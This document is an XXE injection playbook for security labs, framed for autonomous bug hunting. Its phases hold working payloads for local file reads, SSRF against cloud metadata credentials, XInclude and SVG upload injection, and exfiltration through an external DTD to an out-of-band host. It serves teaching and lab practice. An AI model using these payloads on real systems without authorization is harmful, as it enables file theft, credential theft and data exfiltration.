# XXE (XML External Entity) Injection Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> An XML parser that resolves external entities can be steered into file read,
> SSRF, and out-of-band exfiltration.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Find XML Entry Points
- `Content-Type: application/xml` / `text/xml` requests
- SOAP endpoints, SAML, RSS, SVG/DOCX/XLSX uploads (zipped XML)
- Endpoints that used to be XML — try switching JSON to XML:
```
Content-Type: application/xml

<?xml version="1.0"?><root><item>1</item></root>
```

### 1.2 Confirm Entity Processing
```xml
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY x "INJECTED"> ]>
<stockCheck><productId>&x;</productId></stockCheck>
```
- If `INJECTED` appears in the response, entities are resolved.

---

## Phase 2: Exploitation Techniques

### 2.1 In-Band File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE d [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### 2.2 SSRF via XXE
```xml
<!DOCTYPE d [ <!ENTITY xxe SYSTEM
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### 2.3 XInclude (no DOCTYPE control)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
- Use when you can only inject into a value, not the whole document.

### 2.4 XXE via File Upload (SVG / Office)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### 2.5 Blind XXE — Out-of-Band (OAST)
```xml
<!DOCTYPE d [ <!ENTITY xxe SYSTEM "http://OASTID.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### 2.6 Blind XXE — Data Exfiltration via External DTD
Host `evil.dtd` on the exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OASTID.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
Trigger it:
```xml
<!DOCTYPE d [ <!ENTITY % xxe SYSTEM "https://exploit-server/evil.dtd"> %xxe; ]>
<stockCheck><productId>1</productId></stockCheck>
```

### 2.7 Blind XXE via Error Messages
- Reference a nonexistent file inside a parameter entity so the parser leaks the
  file contents in the error message.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **File retrieval**: `SYSTEM "file:///etc/passwd"` in `productId`.
- **SSRF via XXE**: fetch EC2 metadata (`169.254.169.254`).
- **Blind XXE via OOB**: entity pointing at Collaborator.
- **Blind XXE via external DTD (exfiltration)**: two-stage parameter entities.
- **Blind XXE via error messages**: malformed SYSTEM path leaks file content.
- **XInclude / SVG upload**: when you cannot control the DOCTYPE.
- **XXE to RCE (rare, expect lang)**: `expect://id` when the PHP expect wrapper is on.

---

## Phase 4: Tools & Automation
- Burp Repeater to iterate entities; Collaborator for OOB.
- Try converting any JSON endpoint to XML and re-testing.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| DOCTYPE blocked | Use XInclude |
| No output (blind) | Move to OOB with an external DTD |
| Egress blocked | Use error-based exfiltration |
| Upload only | Embed XXE in SVG / Office XML |

## Success Criteria
- [ ] Read a target file or reached an internal/metadata endpoint
- [ ] Exfiltrated the required data (OOB or in-band)
- [ ] Lab shows "solved"
